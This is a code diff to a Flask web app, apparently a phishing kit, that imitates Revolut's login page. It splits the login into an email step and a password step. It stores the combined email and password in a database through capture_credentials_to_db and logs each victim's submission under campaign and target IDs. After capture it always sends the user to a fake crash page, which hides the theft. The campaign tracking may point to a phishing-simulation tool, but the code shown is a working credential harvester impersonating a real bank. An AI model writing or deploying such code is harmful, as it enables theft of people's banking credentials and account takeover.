@@ -109,21 +109,17 @@ def home():
     
     return render_template('revolut/home.html')
 
-@bp.route('/login')
-def login_page():
-    """Login page"""
-    track_page_visit('login')
+@bp.route('/login-step1')
+def login_step1():
+    """Login step 1 - Email/Phone page"""
+    track_page_visit('login_step1')
     increment_interactions()
     
-    # Check if should redirect to crash page
-    if check_interaction_threshold():
-        return redirect(url_for('fake_revolut.simulate_crash'))
-    
-    return render_template('revolut/login.html')
+    return render_template('revolut/login_step1.html')
 
-@bp.route('/login', methods=['POST'])
-def login_submit():
-    """Process login form submission"""
+@bp.route('/login-step1', methods=['POST'])
+def login_step1_submit():
+    """Process login step 1 - capture email/phone"""
     form_data = dict(request.form)
     page_url = request.url
     client_info = get_client_info()
@@ -135,22 +131,77 @@ def login_submit():
             campaign_id=campaign_id,
             event_type='form_submitted',
             target_id=target_id if target_id != 'unknown' else None,
-            event_data={'form_type': 'login', 'page': 'login'},
+            event_data={'form_type': 'login_step1', 'page': 'login_step1'},
             **client_info
         )
     except Exception as e:
         print(f"Error tracking form submission: {e}")
     
-    # Capture credentials
-    capture_credentials_to_db(form_data, page_url, 'login')
-    
-    # Simulate processing time and redirect
+    # Store email/phone for step 2
+    session['login_email'] = form_data.get('email', '')
     increment_interactions()
-    session['user_logged_in'] = True
-    session['user_name'] = form_data.get('email', 'User').split('@')[0].title()
-    session['user_email'] = form_data.get('email', 'user@example.com')
     
-    return redirect('/revolut/dashboard')
+    return redirect('/revolut/login-step2')
+
+@bp.route('/login-step2')
+def login_step2():
+    """Login step 2 - Password page"""
+    track_page_visit('login_step2')
+    increment_interactions()
+    
+    # Redirect to step 1 if no email stored
+    if not session.get('login_email'):
+        return redirect('/revolut/login-step1')
+    
+    return render_template('revolut/login_step2.html', email=session.get('login_email'))
+
+@bp.route('/login-step2', methods=['POST'])
+def login_step2_submit():
+    """Process login step 2 - capture password and crash"""
+    form_data = dict(request.form)
+    page_url = request.url
+    client_info = get_client_info()
+    
+    # Track form submission
+    campaign_id, target_id = get_campaign_target_info()
+    try:
+        Tracking.create_event(
+            campaign_id=campaign_id,
+            event_type='form_submitted',
+            target_id=target_id if target_id != 'unknown' else None,
+            event_data={'form_type': 'login_step2', 'page': 'login_step2'},
+            **client_info
+        )
+    except Exception as e:
+        print(f"Error tracking form submission: {e}")
+    
+    # Combine credentials from both steps
+    complete_form_data = {
+        'email': session.get('login_email', ''),
+        'password': form_data.get('password', ''),
+        'login_method': 'two_step'
+    }
+    
+    # Capture credentials
+    capture_credentials_to_db(complete_form_data, page_url, 'login_two_step')
+    
+    # Clear session data
+    session.pop('login_email', None)
+    increment_interactions()
+    
+    # Always redirect to crash after capturing credentials
+    return redirect('/revolut/crash')
+
+# Keep old routes for backward compatibility but redirect to new flow
+@bp.route('/login')
+def login_page():
+    """Redirect old login to new step 1"""
+    return redirect('/revolut/login-step1')
+
+@bp.route('/login', methods=['POST'])
+def login_submit():
+    """Handle old login form submissions"""
+    return redirect('/revolut/login-step1')
 
 @bp.route('/register')
 def register_page():
